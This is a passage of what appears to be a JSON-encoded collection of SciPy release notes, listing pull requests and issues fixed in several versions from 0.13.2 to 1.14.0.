`10377 <https://github.com/scipy/scipy/pull/10377>`__: TST, MAINT: adjustments for pytest 5.0\n* `10379 <https://github.com/scipy/scipy/pull/10379>`__: BUG: sparse: set writeability to be forward-compatible with numpy>=1.17\n* `10426 <https://github.com/scipy/scipy/pull/10426>`__: MAINT: Fix doc build bugs\n* `10431 <https://github.com/scipy/scipy/pull/10431>`__: Update numpy version for AIX\n* `10457 <https://github.com/scipy/scipy/pull/10457>`__: BUG: Allow ckdtree to accept empty data input\n* `10503 <https://github.com/scipy/scipy/pull/10503>`__: BUG: spatial/qhull: get HalfspaceIntersection.dual_points from the correct array\n* `10516 <https://github.com/scipy/scipy/pull/10516>`__: BUG: Use nogil contexts in cKDTree\n* `10520 <https://github.com/scipy/scipy/pull/10520>`__: DOC: Proper .rst formatting for deprecated features and Backwards incompatible changes\n* `10540 <https://github.com/scipy/scipy/pull/10540>`__: MAINT: Fix Travis and Circle \n* `10573 <https://github.com/scipy/scipy/pull/10573>`__: BUG: Fix query_ball_point with discontiguous input\n* `10600 <https://github.com/scipy/scipy/pull/10600>`__: BUG: interpolate: fix broken conversions between PPoly/BPoly objects\n\n\n==========================\n", "0.15.1": "==========================\n\nSciPy 0.15.1 is a bug-fix release with no new features compared to 0.15.0.\n\nIssues fixed\n------------\n\n* `4413 <https://github.com/scipy/scipy/pull/4413>`__: BUG: Tests too strict, f2py doesn't have to overwrite this array\n* `4417 <https://github.com/scipy/scipy/pull/4417>`__: BLD: avoid using NPY_API_VERSION to check not using deprecated...\n* `4418 <https://github.com/scipy/scipy/pull/4418>`__: Restore and deprecate scipy.linalg.calc_work\n\n\n==========================\n", "0.17.1": "------------------------\n\n- `5902 <https://github.com/scipy/scipy/pull/5902>`__: BUG: interpolate: make interp1d handle np.float128 again\n- `5957 <https://github.com/scipy/scipy/pull/5957>`__: BUG: slow down with p=np.inf in 0.17 cKDTree.query\n- `5970 <https://github.com/scipy/scipy/pull/5970>`__: Actually propagate nans through stats functions with nan_policy=\"propagate\"\n- `5971 <https://github.com/scipy/scipy/pull/5971>`__: BUG: linalg: fix lwork check in ``*gelsy``\n- `6074 <https://github.com/scipy/scipy/pull/6074>`__: BUG: special: fixed violation of strict aliasing rules.\n- `6083 <https://github.com/scipy/scipy/pull/6083>`__: BUG: Fix dtype for sum of linear operators\n- `6100 <https://github.com/scipy/scipy/pull/6100>`__: BUG: Fix mannwhitneyu to be backward compatible\n- `6135 <https://github.com/scipy/scipy/pull/6135>`__: Don't pass null pointers to LAPACK, even during workspace queries.\n- `6148 <https://github.com/scipy/scipy/pull/6148>`__: stats: fix handling of nan values in T tests and kendalltau\n\n\n\n\n==========================\n", "0.14.1": "==========================\n\nSciPy 0.14.1 is a bug-fix release with no new features compared to 0.14.0.\n\n\nIssues closed\n-------------\n\n- `3630 <https://github.com/scipy/scipy/issues/3630>`__: NetCDF reading results in a segfault\n- `3631 <https://github.com/scipy/scipy/issues/3631>`__: SuperLU object not working as expected for complex matrices\n- `3733 <https://github.com/scipy/scipy/issues/3733>`__: segfault from map_coordinates\n- `3780 <https://github.com/scipy/scipy/issues/3780>`__: Segfault when using CSR/CSC matrix and uint32/uint64\n- `3781 <https://github.com/scipy/scipy/pull/3781>`__: BUG: sparse: fix omitted types in sparsetools typemaps\n- `3802 <https://github.com/scipy/scipy/issues/3802>`__: 0.14.0 API breakage: _gen generators are missing from scipy.stats.distributions API\n- `3805 <https://github.com/scipy/scipy/issues/3805>`__: ndimage test failures with numpy 1.10\n- `3812 <https://github.com/scipy/scipy/issues/3812>`__: == sometimes wrong on csr_matrix\n- `3853 <https://github.com/scipy/scipy/issues/3853>`__: Many scipy.sparse test errors/failures with numpy 1.9.0b2\n- `4084 <https://github.com/scipy/scipy/pull/4084>`__: fix exception declarations for Cython 0.21.1 compatibility\n- `4093 <https://github.com/scipy/scipy/pull/4093>`__: BUG: fitpack: avoid a memory error in splev(x, tck, der=k)\n- `4104 <https://github.com/scipy/scipy/pull/4104>`__: BUG: Workaround SGEMV segfault in Accelerate (maintenance 0.14.x)\n- `4143 <https://github.com/scipy/scipy/pull/4143>`__: BUG: fix ndimage functions for large data\n- `4149 <https://github.com/scipy/scipy/issues/4149>`__: Bug in expm for integer arrays\n- `4154 <https://github.com/scipy/scipy/issues/4154>`__: Backport gh-4041 for 0.14.1 (Ensure that the 'size' argument of PIL's 'resize' method is a tuple)\n- `4163 <https://github.com/scipy/scipy/issues/4163>`__: Backport #4142 (ZeroDivisionError in scipy.sparse.linalg.lsqr)\n- `4164 <https://github.com/scipy/scipy/issues/4164>`__: Backport gh-4153 (remove use of deprecated numpy API in lib/lapack/ f2py wrapper)\n- `4180 <https://github.com/scipy/scipy/pull/4180>`__: backport pil resize support tuple fix\n- `4168 <https://github.com/scipy/scipy/issues/4168>`__: Lots of arpack test failures on windows 32 bits with numpy 1.9.1\n- `4203 <https://github.com/scipy/scipy/issues/4203>`__: Matrix multiplication in 0.14.x is more than 10x slower compared...\n- `4218 <https://github.com/scipy/scipy/pull/4218>`__: attempt to make ndimage interpolation compatible with numpy relaxed...\n- `4225 <https://github.com/scipy/scipy/pull/4225>`__: BUG: off-by-one error in PPoly shape checks\n- `4248 <https://github.com/scipy/scipy/pull/4248>`__: BUG: optimize: fix issue with incorrect use of closure for slsqp.\n\n\n==========================\n", "0.13.2": "==========================\n\nSciPy 0.13.2 is a bug-fix release with no new features compared to 0.13.1.\n\n\nIssues fixed\n------------\n\n- 3096: require Cython 0.19, earlier versions have memory leaks in fused types\n- 3079: ``ndimage.label`` fix swapped 64-bitness test\n- 3108: ``optimize.fmin_slsqp`` constraint violation\n\n\n==========================\n", "1.4.1": "-----------------------\n\n* `11238 <https://github.com/scipy/scipy/pull/11238>`__: BLD: update minimum pybind11 version to 2.4.0.\n\n\n==========================\n", "1.14.0": "************************\n\n* `13534 <https://github.com/scipy/scipy/pull/13534>`__: ENH: Add more initialization methods for HessianUpdateStrategy\n* `15321 <https://github.com/scipy/scipy/pull/15321>`__: ENH: fft: Add \\`prev_fast_len\\` to complement \\`next_fast_len\\`\n* `17348 <https://github.com/scipy/scipy/pull/17348>`__: BUG: integrate: make \\`select_initial_step\\` aware of integration...\n* `17924 <https://github.com/scipy/scipy/pull/17924>`__: ENH: sparse.linalg: speed up \\`spsolve_triangular\\`\n* `18926 <https://github.com/scipy/scipy/pull/18926>`__: ENH: Move symiirorder1/2, cspline2d, qspline2d and spline_filter...\n* `19561 <https://github.com/scipy/scipy/pull/19561>`__: ENH: stats.power: add function to simulate hypothesis test power\n* `19627 <https://github.com/scipy/scipy/pull/19627>`__: FIX: correctly compute group_delay for complex-coefficient TFs\n* `19673 <https://github.com/scipy/scipy/pull/19673>`__: DEP: signal: raise error using medfilt and order_filter with...\n* `19706 <https://github.com/scipy/scipy/pull/19706>`__: ENH: Add half=True kwarg to minimum_phase\n* `19816 <https://github.com/scipy/scipy/pull/19816>`__: BLD: Add Accelerate support for macOS 13.3+\n* `19900 <https://github.com/scipy/scipy/pull/19900>`__: MAINT/TST: fft: remove xp backend skips, test \\`fftfreq\\` \\`device\\`\n* `19904 <https://github.com/scipy/scipy/pull/19904>`__: MAINT: remove incidental imports from private modules\n* `19923 <https://github.com/scipy/scipy/pull/19923>`__: ENH: stats.mannwhitneyu: replace exact p-value calculation\n* `19954 <https://github.com/scipy/scipy/pull/19954>`__: MAINT: Translate wright_bessel function to C++\n* `19960 <https://github.com/scipy/scipy/pull/19960>`__: DOC: Add examples to \\`scipy.interpolate.spalde\\`\n* `19994 <https://github.com/scipy/scipy/pull/19994>`__: ENH: add cobyqa to scipy.optimize.\n* `20073 <https://github.com/scipy/scipy/pull/20073>`__: ENH: special: fix premature overflow in \\`boxcox\\`\n* `20079 <https://github.com/scipy/scipy/pull/20079>`__: ENH: io: Read and write wav files of size > 4GB\n* `20085 <https://github.com/scipy/scipy/pull/20085>`__: ENH: array types: add JAX support\n* `20089 <https://github.com/scipy/scipy/pull/20089>`__: ENH: Translate complex valued hyp2f1 to C++ and make improvements\n* `20127 <https://github.com/scipy/scipy/pull/20127>`__: ENH/TST: Refactor refguide-check, take 3\n* `20137 <https://github.com/scipy/scipy/pull/20137>`__: ENH: stats.pearsonr: add support for \\`axis\\` argument\n* `20187 <https://github.com/scipy/scipy/pull/20187>`__: ENH: sparse.csgraph: Yen K-shortest paths\n* `20199 <https://github.com/scipy/scipy/pull/20199>`__: DOC/DEV/MAINT: update core-dev guide\n* `20202 <https://github.com/scipy/scipy/pull/20202>`__: DOC: Reorganize contents of stats User Guide section\n* `20255 <https://github.com/scipy/scipy/pull/20255>`__: TST: linalg: reenable gges[float32] tests\n* `20257 <https://github.com/scipy/scipy/pull/20257>`__: BUG: prevent file descriptor leak in \\`openblas_support.py\\`...\n* `20260 <https://github.com/scipy/scipy/pull/20260>`__: ENH: Begin overhaul of ufunc machinery\n* `20265 <https://github.com/scipy/scipy/pull/20265>`__: ENH: optimize: const qualify Cython array arguments\n* `20269 <https://github.com/scipy/scipy/pull/20269>`__: REL: set version to 1.14.0dev0\n* `20273 <https://github.com/scipy/scipy/pull/20273>`__: MAINT/DEV: enforce minimum \\`ruff\\` version\n* `20275 <https://github.com/scipy/scipy/pull/20275>`__: MAINT/DEV: add auto-fix to \\`dev.py lint\\`\n* `20278 <https://github.com/scipy/scipy/pull/20278>`__: DEP: integrate: remove simps,trapz,cumtrapz\n* `20281 <https://github.com/scipy/scipy/pull/20281>`__: BUG: optimize: correct \\`nfev\\` values\n* `20283 <https://github.com/scipy/scipy/pull/20283>`__: DEP: sparse: deprecate conjtransp() method for dok_array/matrix...\n* `20284 <https://github.com/scipy/scipy/pull/20284>`__: ENH: stats.pearsonr: add array API support\n* `20289 <https://github.com/scipy/scipy/pull/20289>`__: DOC: Pin Jupyterlite Sphinx to avoid noisy doc builds\n* `20292 <https://github.com/scipy/scipy/pull/20292>`__: ENH: stats.moment: add array API support\n* `20295 <https://github.com/scipy/scipy/pull/20295>`__: BUG: linalg: support empty arrays\n* `20297 <https://github.com/scipy/scipy/pull/20297>`__: BUG: linalg: use SYEV not SYEVR for pinvh\n* `20298 <https://github.com/scipy/scipy/pull/20298>`__: DOC: linalg: mention that eigenvalues_only=True/False may change...\n* `20304 <https://github.com/scipy/scipy/pull/20304>`__: ENH: interpolate: allow Akima extrapolation\n* `20310 <https://github.com/scipy/scipy/pull/20310>`__: MAINT: Pin jupyterlite-sphinx to >=0.13.1\n* `20315 <https://github.com/scipy/scipy/pull/20315>`__: DOC: add docs on how to debug linear algebra related issues\n* `20317 <https://github.com/scipy/scipy/pull/20317>`__: MAINT/DEV: rename \\`skip_if_array_api\\` to \\`skip_xp_backends\\`\n* `20320 <https://github.com/scipy/scipy/pull/20320>`__: ENH: Generalised ufuncs in special\n* `20321 <https://github.com/scipy/scipy/pull/20321>`__: BUG: Fix for scipy.special seterr, geterr, errstate\n* `20325 <https://github.com/scipy/scipy/pull/20325>`__: MAINT: Improve performance of ndimage.binary_erosion\n* `20326 <https://github.com/scipy/scipy/pull/20326>`__: MAINT: Replace usage of np.prod\n* `20328 <https://github.com/scipy/scipy/pull/20328>`__: DOC: fix small typo in odds_ratio\n* `20329 <https://github.com/scipy/scipy/pull/20329>`__: MAINT: update \\`array_api_compat\\` to v1.5.1\n* `20331 <https://github.com/scipy/scipy/pull/20331>`__: MAINT: Fix Cythonize bug in optimize with const view\n* `20335 <https://github.com/scipy/scipy/pull/20335>`__: TST: linalg: undo xfails of QZ and DARE\n* `20342 <https://github.com/scipy/scipy/pull/20342>`__: BLD: linalg: fix rebuild dependencies for .pyf.src files\n* `20354 <https://github.com/scipy/scipy/pull/20354>`__: MAINT: unpin pytest for wheels\n* `20355 <https://github.com/scipy/scipy/pull/20355>`__: TST: signal: bump tolerance for new \\`signal.group_delay\\` test\n* `20356 <https://github.com/scipy/scipy/pull/20356>`__: BLD: update numpy build dependency in pyproject.toml for numpy...\n* `20367 <https://github.com/scipy/scipy/pull/20367>`__: STY: always \\`import numpy as np\\`\n* `20373 <https://github.com/scipy/scipy/pull/20373>`__: MAINT: drop Python 3.9 and NumPy 1.22.x\n* `20380 <https://github.com/scipy/scipy/pull/20380>`__: MAINT: forward port 1.13.0 relnotes\n* `20382 <https://github.com/scipy/scipy/pull/20382>`__: MAINT: lint: enforce \\`numpy as np\\` alias\n* `20384 <https://github.com/scipy/scipy/pull/20384>`__: ENH:special:Re-rewrite cdflib in C\n* `20390 <https://github.com/scipy/scipy/pull/20390>`__: MAINT:Translate the entirety of cephes into C++\n* `20393 <https://github.com/scipy/scipy/pull/20393>`__: MAINT/BLD: Remove \\`stats._boost\\` and add the distribution related...\n* `20397 <https://github.com/scipy/scipy/pull/20397>`__: ENH: Support scalar-first order of quaternion components in Rotation\n* `20403 <https://github.com/scipy/scipy/pull/20403>`__: ENH: special: add ufuncs for amos\n* `20404 <https://github.com/scipy/scipy/pull/20404>`__: BUG: interpolate: fix high memory usage for 2 classes\n* `20405 <https://github.com/scipy/scipy/pull/20405>`__: BUG: Fix pair of bugs in Amos and Cephes yv which masked each...\n* `20413 <https://github.com/scipy/scipy/pull/20413>`__: MAINT: Vendor npyrandom instead of using static library\n* `20416 <https://github.com/scipy/scipy/pull/20416>`__: ENH: optimize._chandrupatla: allow infinite function value at...\n* `20417 <https://github.com/scipy/scipy/pull/20417>`__: ENH: Make cython_special actual code, not autogenerated\n* `20418 <https://github.com/scipy/scipy/pull/20418>`__: BUG: signal: corrections to \\`iir{peak,notch,comb}\\` filter gain\n* `20420 <https://github.com/scipy/scipy/pull/20420>`__: DOC: stats: speed up the very slow \\`bootstrap\\` examples\n* `20421 <https://github.com/scipy/scipy/pull/20421>`__: Added float32 overloads for amos functions\n* `20422 <https://github.com/scipy/scipy/pull/20422>`__: TST: Test cimporting Cython APIs\n* `20424 <https://github.com/scipy/scipy/pull/20424>`__: MAINT:special: Add license to cdflib and remove old pxd file\n* `20425 <https://github.com/scipy/scipy/pull/20425>`__: MAINT: Fix DOI visibility badge in README\n* `20426 <https://github.com/scipy/scipy/pull/20426>`__: DOC: add hints on how to debug linalg issues with gdb\n* `20427 <https://github.com/scipy/scipy/pull/20427>`__: DOC: speed up some examples\n* `20438 <https://github.com/scipy/scipy/pull/20438>`__: ENH: Translate \\`sph_harm\\` Cython->C++, add \\`sph_harm_all\\`...\n* `20441 <https://github.com/scipy/scipy/pull/20441>`__: BLD: Install cython_special.pxd\n* `20443 <https://github.com/scipy/scipy/pull/20443>`__: MAINT: sparse: Update EfficiencyWarning message to reflect array/matrix\n* `20445 <https://github.com/scipy/scipy/pull/20445>`__: ENH: sparse: special-case DIA \\* scalar\n* `20446 <https://github.com/scipy/scipy/pull/20446>`__: MAINT: remove repetitive word typos\n* `20450 <https://github.com/scipy/scipy/pull/20450>`__: BLD: avoid setting an environment variable in a meson.build file\n* `20453 <https://github.com/scipy/scipy/pull/20453>`__: DOC: special: add examples for pdtrc, pdtri, pdtrik\n* `20454 <https://github.com/scipy/scipy/pull/20454>`__: DOC: Update toolchain roadmap (1/N)\n* `20456 <https://github.com/scipy/scipy/pull/20456>`__: BUG: signal.iirfilter: avoid integer overflow\n* `20457 <https://github.com/scipy/scipy/pull/20457>`__: ENH: Add \\`scipy.special._ufuncs._iv_ratio\\`\n* `20460 <https://github.com/scipy/scipy/pull/20460>`__: DOC: Remove extra css colors and settings\n* `20462 <https://github.com/scipy/scipy/pull/20462>`__: DOC: update readme with link to new forum\n* `20463 <https://github.com/scipy/scipy/pull/20463>`__: MAINT: Refactor special function ufunc generation and consolidate...\n* `20465 <https://github.com/scipy/scipy/pull/20465>`__: MAINT: special: fix compiler warning for unused variable\n* `20467 <https://github.com/scipy/scipy/pull/20467>`__: MAINT: stats._contains_nan: fix bug when -inf and inf are in...\n* `20468 <https://github.com/scipy/scipy/pull/20468>`__: TST: stats: mark tests slow/xslow\n* `20469 <https://github.com/scipy/scipy/pull/20469>`__: MAINT/CI: Remove doctesting from refguide-check\n* `20477 <https://github.com/scipy/scipy/pull/20477>`__: BLD: ensure all static libraries use hidden visibility\n* `20478 <https://github.com/scipy/scipy/pull/20478>`__: CI/MAINT: Increase minimum required compiler versions to GCC...\n* `20480 <https://github.com/scipy/scipy/pull/20480>`__: CI: fail slow tests\n* `20481 <https://github.com/scipy/scipy/pull/20481>`__: ENH: stats: Add the Irwin-Hall distribution\n* `20482 <https://github.com/scipy/scipy/pull/20482>`__: CI: standardize job names\n* `20483 <https://github.com/scipy/scipy/pull/20483>`__: ENH: special: translate \\`sph_bessel\\` to C++, refactor \\`cyl_bessel\\`\n* `20487 <https://github.com/scipy/scipy/pull/20487>`__: TST: adjust other very slow tests\n* `20490 <https://github.com/scipy/scipy/pull/20490>`__: BUG: sparse: raise error for array classes, document/test old...\n* `20494 <https://github.com/scipy/scipy/pull/20494>`__: BUG: _qmc.py::_random_oa_lhs produces correlated samples\n* `20495 <https://github.com/scipy/scipy/pull/20495>`__: BUG: Remove keyword argument from ValueError in SciPy.optimize\n* `20497 <https://github.com/scipy/scipy/pull/20497>`__: DEP: interpolate: replace interp2d by stub\n* `20498 <https://github.com/scipy/scipy/pull/20498>`__: DEP: switch sparse methods to kwarg-only; remove tol/restrt kwargs\n* `20499 <https://github.com/scipy/scipy/pull/20499>`__: DEP: execute sparse array API deprecations\n* `20500 <https://github.com/scipy/scipy/pull/20500>`__: DOC: Update dead reference link in \\`Scipy.linalg._solvers.py\\`:...\n* `20501 <https://github.com/scipy/scipy/pull/20501>`__: MAINT: optimize._chandrupatla: reduce xatol\n* `20503 <https://github.com/scipy/scipy/pull/20503>`__: MAINT: spatial: Fix type annotation of \\`query_ball_point\\`\n* `20508 <https://github.com/scipy/scipy/pull/20508>`__: DOC: Fix legacy admonition styling\n* `20510 <https://github.com/scipy/scipy/pull/20510>`__: BLD: Accelerate wheels for macOS 14+\n* `20511 <https://github.com/scipy/scipy/pull/20511>`__: BUG: Fix raising ValueError on a zero-size array for SciPy.special.logsumexp\n* `20515 <https://github.com/scipy/scipy/pull/20515>`__: BLD: default to C17 rather than C99\n* `20522 <https://github.com/scipy/scipy/pull/20522>`__: TST: Skip or fix some failing tests on certain macOS builds\n* `20526 <https://github.com/scipy/scipy/pull/20526>`__: BLD: adjust lower bound on Clang/LLVM from 14.0 to 12.0\n* `20529 <https://github.com/scipy/scipy/pull/20529>`__: MAINT: remove repeated \"is\" typos\n* `20534 <https://github.com/scipy/scipy/pull/20534>`__: BUG: Fixes incorrect upper_band value for scipy.linalg.bandwidth\n* `20536 <https://github.com/scipy/scipy/pull/20536>`__: CI: Check whether Python.h is included first in a file\n* `20538 <https://github.com/scipy/scipy/pull/20538>`__: TST: _lib: remove redundant test for missing \\`stacklevel\\`\n* `20541 <https://github.com/scipy/scipy/pull/20541>`__: ENH: stats.skew: add array-API support\n* `20542 <https://github.com/scipy/scipy/pull/20542>`__: BLD: Accelerate builds should not define \\`NO_APPEND_FORTRAN\\`\n* `20545 <https://github.com/scipy/scipy/pull/20545>`__: ENH: stats.ttest_1samp: add array-API support\n* `20546 <https://github.com/scipy/scipy/pull/20546>`__: DOC: use more correct and inclusive pronouns\n* `20547 <https://github.com/scipy/scipy/pull/20547>`__: DOC: stats.linregress: split stats/mstats documentation\n* `20548 <https://github.com/scipy/scipy/pull/20548>`__: TST: Skip Cython tests for editable installs\n* `20550 <https://github.com/scipy/scipy/pull/20550>`__: DEP: stats: switch kendalltau to kwarg-only, remove initial_lexsort...\n* `20554 <https://github.com/scipy/scipy/pull/20554>`__: DEP: integrate: switch simpson to kwarg-only, remove even kwarg\n* `20556 <https://github.com/scipy/scipy/pull/20556>`__: DOC: release process updates\n* `20559 <https://github.com/scipy/scipy/pull/20559>`__: DOC/DEV: add core-dev page on vendored code\n* `20560 <https://github.com/scipy/scipy/pull/20560>`__: DEP: linalg: remove turbo / eigvals kwargs from linalg.{eigh,eigvalsh}...\n* `20563 <https://github.com/scipy/scipy/pull/20563>`__: BUG: Fix invalid default bracket selection in _bracket_minimum\n* `20565 <https://github.com/scipy/scipy/pull/20565>`__: DEP: linalg: remove cond / rcond kwargs from linalg.pinv and...\n* `20568 <https://github.com/scipy/scipy/pull/20568>`__: DOC: change approx_fprime doctest\n* `20572 <https://github.com/scipy/scipy/pull/20572>`__: MAINT: vendor Tempita in \\`scipy/_build_utils\\`\n* `20575 <https://github.com/scipy/scipy/pull/20575>`__: TST: stats.skew: assert_equal -> xp_assert_equal as appropriate\n* `20577 <https://github.com/scipy/scipy/pull/20577>`__: DEV: add unicode check to pre-commit-hook\n* `20578 <https://github.com/scipy/scipy/pull/20578>`__: DEP: signal: remove nyq / Hz kwargs in firwin\\* and switch to...\n* `20582 <https://github.com/scipy/scipy/pull/20582>`__: MAINT: optimize.isotonic_regression: remove unnecessary copies\n* `20583 <https://github.com/scipy/scipy/pull/20583>`__: TST: stats.rv_continuous.fit: adjust fit XSLOW/XFAIL/skip sets\n* `20585 <https://github.com/scipy/scipy/pull/20585>`__: CI/BLD: use scipy-openblas wheel when building\n* `20588 <https://github.com/scipy/scipy/pull/20588>`__: DEP: special: remove legacy kwarg from special.comb and switch...\n* `20590 <https://github.com/scipy/scipy/pull/20590>`__: Revert \"ENH: Use \\`highspy\\` in \\`linprog\\`\"\n* `20593 <https://github.com/scipy/scipy/pull/20593>`__: ENH: constants: add array api support\n* `20595 <https://github.com/scipy/scipy/pull/20595>`__: ENH: \\`stats.circ___\\`: add array-API support\n* `20597 <https://github.com/scipy/scipy/pull/20597>`__: ENH: stats.skewtest: add array-API support\n* `20600 <https://github.com/scipy/scipy/pull/20600>`__: TYP: update supported Mypy version from 1.0.0 to 1.10.0\n* `20604 <https://github.com/scipy/scipy/pull/20604>`__: ENH: stats.monte_carlo_test: add array API support\n* `20612 <https://github.com/scipy/scipy/pull/20612>`__: BLD: fix use of non-default interpreter, improve f2py handling\n* `20615 <https://github.com/scipy/scipy/pull/20615>`__: ENH: stats: Implement _isf for burr12\n* `20616 <https://github.com/scipy/scipy/pull/20616>`__: DOC: integrate: remove references to deprecated and legacy functions\n* `20619 <https://github.com/scipy/scipy/pull/20619>`__: ENH: spatial: serialize concurrent calls to QHull\n* `20621 <https://github.com/scipy/scipy/pull/20621>`__: TYP: add type annotations to \\`scipy/_lib/_array_api.py\\`\n* `20625 <https://github.com/scipy/scipy/pull/20625>`__: TST: add dtype dependent default rtol to xp_assert_close\n* `20627 <https://github.com/scipy/scipy/pull/20627>`__: MAINT: special: Drop unused function_calls variable in kolmogorov.h\n* `20628 <https://github.com/scipy/scipy/pull/20628>`__: TST: integrate.tanhsinh: make test case XSLOW\n* `20630 <https://github.com/scipy/scipy/pull/20630>`__: ENH: optimize._jacobian: use _differentiate to compute accurate...\n* `20631 <https://github.com/scipy/scipy/pull/20631>`__: ENH: stats.sem: add array-API support\n* `20634 <https://github.com/scipy/scipy/pull/20634>`__: ENH: stats: add array-API support to kstat/kstatvar\n* `20637 <https://github.com/scipy/scipy/pull/20637>`__: MAINT: Fix broken links in \\`datasets._fetchers\\` module\n* `20640 <https://github.com/scipy/scipy/pull/20640>`__: TST: adjust new array API test, slow tests\n* `20642 <https://github.com/scipy/scipy/pull/20642>`__: TST: stats.ttest_1samp: fix xslow test\n* `20643 <https://github.com/scipy/scipy/pull/20643>`__: MAINT:update boost to fix \\`skewnorm.ppf\\`\n* `20645 <https://github.com/scipy/scipy/pull/20645>`__: ENH: optimize.approx_fprime: avoid quadratic memory usage\n* `20646 <https://github.com/scipy/scipy/pull/20646>`__: ENH: special: add \\`log_wright_bessel\\`\n* `20647 <https://github.com/scipy/scipy/pull/20647>`__: ENH: stats.variation: add array-API support\n* `20649 <https://github.com/scipy/scipy/pull/20649>`__: MAINT: sparse: reformat str and repr for sparse arrays, correct...\n* `20651 <https://github.com/scipy/scipy/pull/20651>`__: ENH: stats.kstat/kstatvar: add native support for \\`axis\\`\n* `20656 <https://github.com/scipy/scipy/pull/20656>`__: ENH: Micro-optimizations for spatial.transform.Rotation methods\n* `20657 <https://github.com/scipy/scipy/pull/20657>`__: MAINT: remove unused variable in special\n* `20658 <https://github.com/scipy/scipy/pull/20658>`__: ENH: stats.kurtosis: add array API support\n* `20663 <https://github.com/scipy/scipy/pull/20663>`__: MAINT: stats.kruskal: fix no-arg behavior w/ SCIPY_ARRAY_API=1\n* `20664 <https://github.com/scipy/scipy/pull/20664>`__: Fix typo in cont2discrete\n* `20665 <https://github.com/scipy/scipy/pull/20665>`__: trust-constr make origin of error message clearer when there...\n* `20667 <https://github.com/scipy/scipy/pull/20667>`__: ENH: stats.describe: add array API support\n* `20673 <https://github.com/scipy/scipy/pull/20673>`__: ENH: stats.entropy, special.{entr, rel_entr}: add array API support\n* `20675 <https://github.com/scipy/scipy/pull/20675>`__: DOC: Fixed typo in signal.ellipap\n* `20676 <https://github.com/scipy/scipy/pull/20676>`__: MAINT: clarify dual_annealing-minimizer_kwargs docstring. Closes...\n* `20677 <https://github.com/scipy/scipy/pull/20677>`__: TST: test__differential_evolution tweaks for speed\n* `20679 <https://github.com/scipy/scipy/pull/20679>`__: MAINT: special.wright_bessel: add comment about reference text\n* `20684 <https://github.com/scipy/scipy/pull/20684>`__: MAINT: Fix missing whitespace in signal.iirdesign, spacing consistency...\n* `20685 <https://github.com/scipy/scipy/pull/20685>`__: MAINT: Add graceful handling of invalid initial brackets to elementwise...\n* `20689 <https://github.com/scipy/scipy/pull/20689>`__: ENH: optimize._chandrupatla: add array API support\n* `20694 <https://github.com/scipy/scipy/pull/20694>`__: MAINT: stats: make reducing functions emit consistent warning...\n* `20696 <https://github.com/scipy/scipy/pull/20696>`__: MAINT: stats.gstd: return result rather than raising\n* `20698 <https://github.com/scipy/scipy/pull/20698>`__: DEV/BLD: add --with-accelerate flag to \\`dev.py build\\`\n* `20705 <https://github.com/scipy/scipy/pull/20705>`__: MAINT: Add missing whitespace\n* `20711 <https://github.com/scipy/scipy/pull/20711>`__: MAINT: numpy cleanup version bumps: fixes issue #20458\n* `20712 <https://github.com/scipy/scipy/pull/20712>`__: ENH/BLD: Add install tags for \\`tests\\`\n* `20715 <https://github.com/scipy/scipy/pull/20715>`__: ENH: stats.kurtosistest: add array API support\n* `20716 <https://github.com/scipy/scipy/pull/20716>`__: DEP: integrate.quad_vec: deprecate \\`quadrature=\"trapz\"\\`\n* `20722 <https://github.com/scipy/scipy/pull/20722>`__: ENH: sparse: Speed up \\`_add_sparse\\` for DIA format\n* `20726 <https://github.com/scipy/scipy/pull/20726>`__: DOC: stats.{circmean, circvar, circstd}: improve accuracy/clarity\n* `20730 <https://github.com/scipy/scipy/pull/20730>`__: BUG: special: fix algorithmic error in \\`ratevl\\` in \\`cephes/polevl.h\\`\n* `20732 <https://github.com/scipy/scipy/pull/20732>`__: BUG: interpolate: do not segfault on bad boundary conditions\n* `20734 <https://github.com/scipy/scipy/pull/20734>`__: BUG: stats.ttest_1samp: fix use of \\`keepdims\\`\n* `20736 <https://github.com/scipy/scipy/pull/20736>`__: ENH: stats.normaltest/jarque_bera: add array-API support\n* `20737 <https://github.com/scipy/scipy/pull/20737>`__: TST, MAINT: run optimize array API tests and fix \\`chandrupatla\\`\n* `20738 <https://github.com/scipy/scipy/pull/20738>`__: DOC: sparse.csgraph.dijkstra: add warning for \\`directed=False\\`...\n* `20741 <https://github.com/scipy/scipy/pull/20741>`__: MAINT: optimize: another fail_slow exception for COBYQA\n* `20744 <https://github.com/scipy/scipy/pull/20744>`__: MAINT: use PyTorch 2.3 in CI, fix CuPy failures, more type annotations...\n* `20745 <https://github.com/scipy/scipy/pull/20745>`__: BUG: Fix incorrect brackets in cephes hyperg.h\n* `20746 <https://github.com/scipy/scipy/pull/20746>`__: DOC: stats: update formulas given for kstat/kstatvar to reflect...\n* `20748 <https://github.com/scipy/scipy/pull/20748>`__: TST: bump tolerance to address local \\`test_axis_nan_policy\\`...\n* `20750 <https://github.com/scipy/scipy/pull/20750>`__: ENH: some micro-optimisations for differential_evolution\n* `20751 <https://github.com/scipy/scipy/pull/20751>`__: ENH: stats.bartlett: add native \\`axis\\` and array API support\n* `20753 <https://github.com/scipy/scipy/pull/20753>`__: ENH: stats.chisquare/power_divergence: add array API support\n* `20756 <https://github.com/scipy/scipy/pull/20756>`__: TST: stats: refactor tests of normality tests\n* `20764 <https://github.com/scipy/scipy/pull/20764>`__: TST: stats.fit: address xslow test failures\n* `20765 <https://github.com/scipy/scipy/pull/20765>`__: MAINT: stats.wilcoxon: make \\`method='exact'\\` symmetric w/ ties\n* `20769 <https://github.com/scipy/scipy/pull/20769>`__: MAINT: stats: move \\`multiscale_graphcorr\\` tests to save time\n* `20770 <https://github.com/scipy/scipy/pull/20770>`__: MAINT: optimize: remove circular reference in \\`ScalarFunction\\`\n* `20775 <https://github.com/scipy/scipy/pull/20775>`__: MAINT: forward port 1.13.1 relnotes\n* `20777 <https://github.com/scipy/scipy/pull/20777>`__: ENH: stats: end-to-end array-API support for normality tests\n* `20778 <https://github.com/scipy/scipy/pull/20778>`__: DOC: signal: Documentation improvements of \\`detrend\\` function\n* `20780 <https://github.com/scipy/scipy/pull/20780>`__: DEP: special.comb: deprecate \\`exact=True\\` for non-integer intputs\n* `20781 <https://github.com/scipy/scipy/pull/20781>`__: TST: stats: remove overhead of array_namespace in calls to _get_pvalue\n* `20782 <https://github.com/scipy/scipy/pull/20782>`__: ENH: stats: end-to-end array-API support for NHSTs with chi-squared...\n* `20784 <https://github.com/scipy/scipy/pull/20784>`__: DOC: SciPy 1.14.0 relnotes\n* `20787 <https://github.com/scipy/scipy/pull/20787>`__: DOC: interpolate: mention default kinds in interp2d transition...\n* `20788 <https://github.com/scipy/scipy/pull/20788>`__: ENH: optimize: improve \\`cobyqa\\` 